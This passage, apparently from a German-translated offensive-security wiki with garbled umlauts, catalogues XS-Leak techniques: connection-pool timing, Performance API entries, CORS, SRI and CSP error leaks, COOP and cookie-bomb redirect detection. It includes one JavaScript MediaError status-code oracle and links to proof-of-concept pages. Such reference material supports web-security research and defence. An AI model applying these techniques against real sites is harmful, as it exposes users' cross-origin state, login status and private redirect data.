2. Belegen von 255 Sockets f√ºr eine l√§ngere Zeit, indem 255 Anfragen an verschiedene Hosts gestartet werden, die darauf abzielen, die Verbindungen offen zu halten, ohne sie abzuschlie√üen.
3. Verwenden des 256. Sockets, um eine Anfrage an die Zielseite zu senden.
4. Versuch einer 257. Anfrage an einen anderen Host. Da alle Sockets belegt sind (gem√§√ü Schritten 2 und 3), wird diese Anfrage in die Warteschlange gestellt, bis ein Socket verf√ºgbar wird. Die Verz√∂gerung, bevor diese Anfrage fortgesetzt wird, liefert dem Angreifer zeitliche Informationen √ºber die Netzwerkaktivit√§t, die mit dem 256. Socket zusammenh√§ngt (dem Socket der Zielseite). Diese Schlussfolgerung ist m√∂glich, da die 255 Sockets aus Schritt 2 noch belegt sind, was bedeutet, dass jeder neu verf√ºgbare Socket derjenige sein muss, der aus Schritt 3 freigegeben wurde. Die Zeit, die der 256. Socket ben√∂tigt, um verf√ºgbar zu werden, ist somit direkt mit der Zeit verbunden, die f√ºr die Anfrage an die Zielseite ben√∂tigt wird, um abgeschlossen zu werden.

F√ºr weitere Informationen: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
## Leistung API Techniken

Die [`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) bietet Einblicke in die Leistungsmetriken von Webanwendungen, die durch die [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API) weiter angereichert werden. Die Resource Timing API erm√∂glicht die √úberwachung detaillierter Netzwerkanforderungszeiten, wie z.B. die Dauer der Anforderungen. Insbesondere, wenn Server in ihren Antworten den Header `Timing-Allow-Origin: *` enthalten, stehen zus√§tzliche Daten wie die √úbertragungsgr√∂√üe und die Domain-Lookup-Zeit zur Verf√ºgung.

Diese F√ºlle an Daten kann √ºber Methoden wie [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) oder [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName) abgerufen werden und bietet einen umfassenden √úberblick √ºber leistungsbezogene Informationen. Dar√ºber hinaus erm√∂glicht die API die Messung von Ausf√ºhrungszeiten, indem sie die Differenz zwischen Zeitstempeln berechnet, die von [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) erhalten wurden. Es ist jedoch zu beachten, dass f√ºr bestimmte Operationen in Browsern wie Chrome die Genauigkeit von `performance.now()` auf Millisekunden begrenzt sein kann, was die Granularit√§t von Zeitmessungen beeintr√§chtigen k√∂nnte.

√úber Zeitmessungen hinaus kann die Performance API f√ºr sicherheitsrelevante Erkenntnisse genutzt werden. Zum Beispiel kann das Vorhandensein oder Fehlen von Seiten im `performance`-Objekt in Chrome auf die Anwendung von `X-Frame-Options` hinweisen. Insbesondere, wenn eine Seite aufgrund von `X-Frame-Options` daran gehindert wird, in einem Frame gerendert zu werden, wird sie nicht im `performance`-Objekt erfasst, was einen subtilen Hinweis auf die Framing-Richtlinien der Seite liefert.

### Fehlerleck

* **Einbeziehungsmethoden**: Frames, HTML-Elemente
* **Nachweisbarer Unterschied**: Statuscode
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Zusammenfassung:** Eine Anfrage, die zu Fehlern f√ºhrt, erstellt keinen Ressourcenzeitpunktseintrag.
* **Codebeispiel**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Es ist m√∂glich, **zwischen HTTP-Antwortstatuscodes zu unterscheiden**, da Anfragen, die zu einem **Fehler** f√ºhren, **keinen Leistungseintrag erstellen**.

### Stil-Neuladenfehler

* **Einbeziehungsmethoden**: HTML-Elemente
* **Nachweisbarer Unterschied**: Statuscode
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Zusammenfassung:** Aufgrund eines Browserfehlers werden Anfragen, die zu Fehlern f√ºhren, zweimal geladen.
* **Codebeispiel**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

In der vorherigen Technik wurden auch zwei F√§lle identifiziert, in denen Browserfehler in GC dazu f√ºhren, dass **Ressourcen zweimal geladen werden, wenn sie nicht geladen werden k√∂nnen**. Dies f√ºhrt zu mehreren Eintr√§gen in der Performance API und kann somit erkannt werden.

### Anforderungszusammenf√ºhrungsfehler

* **Einbeziehungsmethoden**: HTML-Elemente
* **Nachweisbarer Unterschied**: Statuscode
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Zusammenfassung:** Anfragen, die zu einem Fehler f√ºhren, k√∂nnen nicht zusammengef√ºhrt werden.
* **Codebeispiel**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Die Technik wurde in einer Tabelle im genannten Papier gefunden, aber keine Beschreibung der Technik wurde darin gefunden. Sie k√∂nnen jedoch den Quellcode √ºberpr√ºfen, der dies unter [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak) √ºberpr√ºft.

### Leckage einer leeren Seite

* **Einbeziehungsmethoden**: Frames
* **Nachweisbarer Unterschied**: Seiteninhalt
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Zusammenfassung:** Leere Antworten erstellen keine Ressourcenzeitpunkteintr√§ge.
* **Codebeispiel**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Ein Angreifer kann erkennen, ob eine Anfrage zu einem leeren HTTP-Antwortk√∂rper gef√ºhrt hat, da **leere Seiten in einigen Browsern keinen Leistungseintrag erstellen**.

### **XSS-Auditor-Leck**

* **Einbeziehungsmethoden**: Frames
* **Nachweisbarer Unterschied**: Seiteninhalt
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Zusammenfassung:** Durch die Verwendung des XSS-Auditors in Sicherheitsaussagen k√∂nnen Angreifer spezifische Webseitenelemente erkennen, indem sie √Ñnderungen in den Antworten beobachten, wenn erstellte Payloads den Filtermechanismus des Auditors ausl√∂sen.
* **Codebeispiel**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

Im Rahmen von Sicherheitsaussagen (SA) kann der XSS-Auditor, der urspr√ºnglich dazu gedacht war, Cross-Site-Scripting (XSS)-Angriffe zu verhindern, paradoxerweise dazu genutzt werden, sensible Informationen preiszugeben. Obwohl dieses integrierte Feature aus Google Chrome (GC) entfernt wurde, ist es immer noch in SA vorhanden. Im Jahr 2013 zeigten Braun und Heiderich, dass der XSS-Auditor versehentlich legitime Skripte blockieren konnte, was zu falschen Positiven f√ºhrte. Aufbauend darauf entwickelten Forscher Techniken, um Informationen zu extrahieren und spezifische Inhalte auf Seiten mit unterschiedlichen Urspr√ºngen zu erkennen, ein Konzept, das als XS-Leaks bekannt ist, das urspr√ºnglich von Terada gemeldet und von Heyes in einem Blogbeitrag ausgearbeitet wurde. Obwohl diese Techniken spezifisch f√ºr den XSS-Auditor in GC waren, wurde festgestellt, dass in SA Seiten, die vom XSS-Auditor blockiert werden, keine Eintr√§ge in der Performance API generieren, was eine Methode aufzeigt, durch die sensible Informationen dennoch preisgegeben werden k√∂nnen.

### X-Frame-Leck

* **Einbeziehungsmethoden**: Frames
* **Nachweisbarer Unterschied**: Header
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Zusammenfassung:** Ressourcen mit dem X-Frame-Options-Header erstellen keinen Ressourcenzeitpunkteintrag.
* **Codebeispiel**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Wenn eine Seite **nicht** in einem **iFrame gerendert werden darf**, wird **kein Leistungseintrag erstellt**. Daher kann ein Angreifer den Antwortheader **`X-Frame-Options`** erkennen.\
Das Gleiche gilt, wenn Sie ein **embed** **Tag verwenden**.

### Downloaderkennung

* **Einbeziehungsmethoden**: Frames
* **Nachweisbarer Unterschied**: Header
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Zusammenfassung:** Downloads erstellen keine Ressourcenzeitpunkteintr√§ge in der Performance API.
* **Codebeispiel**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

√Ñhnlich wie beim beschriebenen XS-Leak erstellt eine **Ressource, die heruntergeladen wird**, aufgrund des ContentDisposition-Headers ebenfalls **keinen Leistungseintrag**. Diese Technik funktioniert in allen g√§ngigen Browsern.
### Weiterleitung Start Leck

* **Inklusionsmethoden**: Frames
* **Erkennbarer Unterschied**: Weiterleitung
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Zusammenfassung**: Die Ressourcenzeitmessung gibt den Startzeitpunkt einer Weiterleitung preis.
* **Codebeispiel**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Wir haben eine XS-Leak-Instanz gefunden, die das Verhalten einiger Browser ausnutzt, die zu viele Informationen f√ºr Cross-Origin-Anfragen protokollieren. Der Standard definiert eine Teilmenge von Attributen, die f√ºr Cross-Origin-Ressourcen auf Null gesetzt werden sollten. In **SA** ist es jedoch m√∂glich festzustellen, ob der Benutzer von der Zielseite **weitergeleitet** wird, indem man das **Performance-API** abfragt und nach den **redirectStart-Timing-Daten** sucht.

### Dauer Weiterleitung Leck

* **Inklusionsmethoden**: Fetch API
* **Erkennbarer Unterschied**: Weiterleitung
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Zusammenfassung**: Die Dauer von Zeitmessungen ist negativ, wenn eine Weiterleitung erfolgt.
* **Codebeispiel**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

In GC ist die **Dauer** f√ºr Anfragen, die zu einer **Weiterleitung** f√ºhren, **negativ** und kann somit von Anfragen, die nicht zu einer Weiterleitung f√ºhren, **unterschieden** werden.

### CORP-Leck

* **Inklusionsmethoden**: Frames
* **Erkennbarer Unterschied**: Header
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Zusammenfassung**: Ressourcen, die mit CORP gesch√ºtzt sind, erzeugen keine Ressourcenzeitmessungseintr√§ge.
* **Codebeispiel**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

In einigen F√§llen kann der **nextHopProtocol-Eintrag** als Lecktechnik verwendet werden. In GC wird, wenn der **CORP-Header** gesetzt ist, das nextHopProtocol **leer** sein. Beachten Sie, dass SA f√ºr mit CORP aktivierten Ressourcen √ºberhaupt keinen Leistungseintrag erstellt.

### Service Worker

* **Inklusionsmethoden**: Frames
* **Erkennbarer Unterschied**: API-Nutzung
* **Weitere Informationen**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Zusammenfassung**: Feststellen, ob ein Service Worker f√ºr einen bestimmten Ursprung registriert ist.
* **Codebeispiel**:

Service Worker sind ereignisgesteuerte Skriptkontexte, die an einem Ursprung ausgef√ºhrt werden. Sie laufen im Hintergrund einer Webseite und k√∂nnen Ressourcen abfangen, √§ndern und **zwischenspeichern**, um eine Offline-Webanwendung zu erstellen.\
Wenn eine von einem **Service Worker zwischengespeicherte Ressource** √ºber ein **iframe** abgerufen wird, wird die Ressource aus dem Service-Worker-Cache **geladen**.\
Um festzustellen, ob die Ressource aus dem Service-Worker-Cache **geladen** wurde, kann das **Performance-API** verwendet werden.\
Dies k√∂nnte auch mit einem Timing-Angriff durchgef√ºhrt werden (weitere Informationen finden Sie im Paper).

### Cache

* **Inklusionsmethoden**: Fetch API
* **Erkennbarer Unterschied**: Zeitmessung
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Zusammenfassung**: Es ist m√∂glich zu √ºberpr√ºfen, ob eine Ressource im Cache gespeichert wurde.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

Mit dem [Performance-API](xs-search.md#performance-api) ist es m√∂glich zu √ºberpr√ºfen, ob eine Ressource im Cache gespeichert ist.

### Netzwerkdauer

* **Inklusionsmethoden**: Fetch API
* **Erkennbarer Unterschied**: Seiteninhalt
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Zusammenfassung**: Es ist m√∂glich, die Netzwerkdauer einer Anfrage aus dem `performance`-API abzurufen.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Fehlermeldungen-Technik

### Medienfehler

* **Inklusionsmethoden**: HTML-Elemente (Video, Audio)
* **Erkennbarer Unterschied**: Statuscode
* **Weitere Informationen**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Zusammenfassung**: In Firefox ist es m√∂glich, den Statuscode einer Cross-Origin-Anfrage genau preiszugeben.
* **Codebeispiel**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
### CORS-Fehler

* **Einschlussmethoden**: Fetch API
* **Erkennbarer Unterschied**: Header
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Zusammenfassung:** In Sicherheitsaussagen (SA) geben CORS-Fehlermeldungen unbeabsichtigt die vollst√§ndige URL von weitergeleiteten Anfragen preis.
* **Codebeispiel**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Diese Technik erm√∂glicht es einem Angreifer, das **Ziel einer Weiterleitung von einer Website mit unterschiedlichem Ursprung zu extrahieren**, indem er ausnutzt, wie Webkit-basierte Browser CORS-Anfragen behandeln. Speziell, wenn eine **CORS-aktiviert Anfrage** an eine Zielseite gesendet wird, die basierend auf dem Benutzerstatus eine Weiterleitung ausl√∂st und der Browser anschlie√üend die Anfrage ablehnt, wird die **vollst√§ndige URL des Weiterleitungsziels** in der Fehlermeldung offengelegt. Diese Schwachstelle enth√ºllt nicht nur die Tatsache der Weiterleitung, sondern auch das Ziel der Weiterleitung und eventuelle **sensible Abfrageparameter**, die sie enthalten kann.

### SRI-Fehler

* **Einschlussmethoden**: Fetch API
* **Erkennbarer Unterschied**: Header
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Zusammenfassung:** In Sicherheitsaussagen (SA) geben SRI-Fehlermeldungen unbeabsichtigt die vollst√§ndige URL von weitergeleiteten Anfragen preis.
* **Codebeispiel**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Ein Angreifer kann **ausf√ºhrliche Fehlermeldungen** ausnutzen, um die Gr√∂√üe von Cross-Origin-Antworten abzuleiten. Dies ist auf den Mechanismus der Subresource Integrity (SRI) zur√ºckzuf√ºhren, der das Integrit√§tsattribut verwendet, um zu validieren, dass Ressourcen, die h√§ufig von CDNs abgerufen werden, nicht manipuliert wurden. Damit SRI bei Cross-Origin-Ressourcen funktioniert, m√ºssen diese **CORS-aktiviert** sein; andernfalls unterliegen sie keiner Integrit√§tspr√ºfung. In Sicherheitsaussagen (SA), √§hnlich wie beim CORS-Fehler XS-Leak, kann eine Fehlermeldung erfasst werden, nachdem eine Abrufanfrage mit einem Integrit√§tsattribut fehlschl√§gt. Angreifer k√∂nnen absichtlich diesen Fehler **ausl√∂sen**, indem sie einen **falschen Hash-Wert** dem Integrit√§tsattribut einer beliebigen Anfrage zuweisen. In SA enth√ºllt die resultierende Fehlermeldung unbeabsichtigt die Inhaltsl√§nge der angeforderten Ressource. Dieses Informationsleck erm√∂glicht es einem Angreifer, Variationen in der Antwortgr√∂√üe zu erkennen und ebnet den Weg f√ºr ausgefeilte XS-Leak-Angriffe.

### CSP-Verletzung/-Erkennung

* **Einschlussmethoden**: Pop-ups
* **Erkennbarer Unterschied**: Statuscode
* **Weitere Informationen**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Zusammenfassung:** Wenn in der CSP nur die Website des Opfers zugelassen wird und versucht wird, auf eine andere Domain umzuleiten, wird ein erkennbarer Fehler in der CSP ausgel√∂st.
* **Codebeispiel**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Ein XS-Leak kann die CSP verwenden, um festzustellen, ob eine Website mit unterschiedlichem Ursprung auf eine andere Domain umgeleitet wurde. Dieses Leck kann die Weiterleitung erkennen, aber zus√§tzlich wird die Domain des Weiterleitungsziels preisgegeben. Die Grundidee dieses Angriffs besteht darin, das **Zieldomain auf der Angreiferwebsite zuzulassen**. Sobald eine Anfrage an die Zieldomain gesendet wird, **leitet sie** zu einer Domain mit unterschiedlichem Ursprung um. Die **CSP blockiert** den Zugriff darauf und erstellt einen **Verletzungsbericht als Lecktechnik**. Abh√§ngig vom Browser kann **dieser Bericht den Zielort der Weiterleitung preisgeben**. Moderne Browser zeigen nicht die URL an, zu der umgeleitet wurde, aber Sie k√∂nnen dennoch erkennen, dass eine Cross-Origin-Weiterleitung ausgel√∂st wurde.

### Cache

* **Einschlussmethoden**: Frames, Pop-ups
* **Erkennbarer Unterschied**: Seiteninhalt
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Zusammenfassung:** L√∂schen Sie die Datei aus dem Cache. √ñffnen Sie die Zielseite, √ºberpr√ºfen Sie, ob die Datei im Cache vorhanden ist.
* **Codebeispiel:**

Browser k√∂nnen einen gemeinsamen Cache f√ºr alle Websites verwenden. Unabh√§ngig von ihrem Ursprung ist es m√∂glich festzustellen, ob eine Zielseite eine **bestimmte Datei angefordert hat**.

Wenn eine Seite ein Bild nur l√§dt, wenn der Benutzer angemeldet ist, k√∂nnen Sie die **Ressource ung√ºltig machen** (damit sie nicht mehr im Cache ist, wenn sie es war, siehe weitere Informationen-Links), **eine Anfrage durchf√ºhren**, die diese Ressource laden k√∂nnte, und versuchen, die Ressource **mit einer fehlerhaften Anfrage zu laden** (z. B. unter Verwendung eines √ºberlangen Referer-Headers). Wenn das Laden der Ressource **keinen Fehler ausl√∂st**, liegt das daran, dass sie **im Cache gespeichert** war.

### CSP-Direktive

* **Einschlussmethoden**: Frames
* **Erkennbarer Unterschied**: Header
* **Weitere Informationen**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Zusammenfassung:** CSP-Headerdirektiven k√∂nnen mithilfe des CSP-Iframe-Attributs √ºberpr√ºft werden, um Richtliniendetails offenzulegen.
* **Codebeispiel**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Ein neuartiges Feature in Google Chrome (GC) erm√∂glicht es Webseiten, eine Content Security Policy (CSP) vorzuschlagen, indem sie ein Attribut auf einem iframe-Element setzen, wobei Richtliniendirektiven zusammen mit der HTTP-Anfrage √ºbertragen werden. Normalerweise muss der eingebettete Inhalt dies **√ºber einen HTTP-Header autorisieren**, oder es wird eine **Fehlerseite angezeigt**. Wenn das iframe jedoch bereits von einer CSP geregelt wird und die neu vorgeschlagene Richtlinie nicht restriktiver ist, wird die Seite normal geladen. Dieser Mechanismus er√∂ffnet einem Angreifer die M√∂glichkeit, **spezifische CSP-Direktiven** einer Website mit unterschiedlichem Ursprung zu erkennen, indem er die Fehlerseite identifiziert. Obwohl diese Schwachstelle als behoben markiert wurde, zeigen unsere Ergebnisse eine **neue Lecktechnik**, die in der Lage ist, die Fehlerseite zu erkennen, was darauf hindeutet, dass das zugrunde liegende Problem nie vollst√§ndig behoben wurde.

### **CORP**

* **Einschlussmethoden**: Fetch API
* **Erkennbarer Unterschied**: Header
* **Weitere Informationen**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Zusammenfassung:** Ressourcen, die mit Cross-Origin Resource Policy (CORP) gesichert sind, werfen einen Fehler aus, wenn sie von einem nicht zugelassenen Ursprung abgerufen werden.
* **Codebeispiel**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)
### CORB

* **Inklusionsmethoden**: HTML-Elemente
* **Erkennbarer Unterschied**: Header
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Zusammenfassung**: CORB kann es Angreifern erm√∂glichen, festzustellen, ob der **`nosniff`-Header vorhanden ist**.
* **Codebeispiel**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

√úberpr√ºfen Sie den Link f√ºr weitere Informationen √ºber den Angriff.

### CORS-Fehler bei falscher Konfiguration der Ursprungsreflexion <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Inklusionsmethoden**: Fetch-API
* **Erkennbarer Unterschied**: Header
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Zusammenfassung**: Wenn der Ursprungsheader im Header `Access-Control-Allow-Origin` reflektiert wird, ist es m√∂glich zu √ºberpr√ºfen, ob eine Ressource bereits im Cache vorhanden ist.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Falls der **Ursprungsheader** im Header `Access-Control-Allow-Origin` reflektiert wird, kann ein Angreifer dieses Verhalten ausnutzen, um zu versuchen, die **Ressource** im **CORS**-Modus abzurufen. Wenn kein **Fehler ausgel√∂st wird**, bedeutet dies, dass die Ressource **korrekt aus dem Web abgerufen wurde**. Wenn ein Fehler ausgel√∂st wird, bedeutet dies, dass sie aus dem Cache abgerufen wurde (der Fehler tritt auf, weil der Cache eine Antwort mit einem CORS-Header speichert, der die urspr√ºngliche Domain und nicht die des Angreifers zul√§sst).\
Beachten Sie, dass wenn der Ursprung nicht reflektiert wird, sondern ein Platzhalter verwendet wird (`Access-Control-Allow-Origin: *`), dies nicht funktioniert.

## Technik der lesbaren Attribute

### Fetch-Weiterleitung

* **Inklusionsmethoden**: Fetch-API
* **Erkennbarer Unterschied**: Statuscode
* **Weitere Informationen**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Zusammenfassung:** GC und SA erm√∂glichen es, den Typ der Antwort (opaqueredirect) nach Abschluss der Weiterleitung zu √ºberpr√ºfen.
* **Codebeispiel**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Durch das Senden einer Anfrage mit der Fetch-API mit `redirect: "manual"` und anderen Parametern ist es m√∂glich, das Attribut `response.type` zu lesen, und wenn es gleich `opaqueredirect` ist, war die Antwort eine Weiterleitung.

### COOP

* **Inklusionsmethoden**: Pop-ups
* **Erkennbarer Unterschied**: Header
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Zusammenfassung:** Seiten, die durch die Cross-Origin-Opener-Richtlinie (COOP) gesch√ºtzt sind, verhindern den Zugriff durch Cross-Origin-Interaktionen.
* **Codebeispiel**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Ein Angreifer ist in der Lage, das Vorhandensein des Headers der Cross-Origin-Opener-Richtlinie (COOP) in einer Cross-Origin-HTTP-Antwort zu deduzieren. COOP wird von Webanwendungen verwendet, um zu verhindern, dass externe Websites beliebige Fensterreferenzen erhalten. Die Sichtbarkeit dieses Headers kann durch den Versuch, auf die **`contentWindow`-Referenz** zuzugreifen, erkannt werden. In Szenarien, in denen COOP bedingt angewendet wird, wird die **`opener`-Eigenschaft** zu einem deutlichen Indikator: Sie ist **undefiniert**, wenn COOP aktiv ist, und **definiert**, wenn COOP nicht aktiv ist.

### URL-Maximall√§nge - Serverseite

* **Inklusionsmethoden**: Fetch-API, HTML-Elemente
* **Erkennbarer Unterschied**: Statuscode / Inhalt
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Zusammenfassung:** Erkennen von Unterschieden in Antworten aufgrund der Umleitungsl√§nge, die m√∂glicherweise zu gro√ü ist, sodass der Server mit einem Fehler antwortet und ein Alarm ausgel√∂st wird.
* **Codebeispiel**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Wenn eine serverseitige Umleitung **Benutzereingaben innerhalb der Umleitung** und **zus√§tzliche Daten verwendet**. Ist es m√∂glich, dieses Verhalten zu erkennen, da Server normalerweise eine **Begrenzung der Anforderungsl√§nge** haben. Wenn die **Benutzerdaten** diese **L√§nge - 1** erreichen, weil die **Umleitung diese Daten** verwendet und **etwas zus√§tzliches hinzuf√ºgt**, wird ein **Fehler √ºber Ereignisse erkennbar** ausgel√∂st.

Wenn es Ihnen gelingt, einem Benutzer Cookies zu setzen, k√∂nnen Sie diesen Angriff auch ausf√ºhren, indem Sie **gen√ºgend Cookies setzen** ([**Cookie-Bombe**](hacking-with-cookies/cookie-bomb.md)), sodass bei **erh√∂hter Gr√∂√üe der Antwort** ein **Fehler** ausgel√∂st wird. In diesem Fall denken Sie daran, dass, wenn Sie diese Anfrage von derselben Seite ausl√∂sen, `<script>` automatisch die Cookies sendet (damit Sie nach Fehlern suchen k√∂nnen).\
Ein Beispiel f√ºr die **Cookie-Bombe + XS-Search** finden Sie in der beabsichtigten L√∂sung dieses Berichts: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

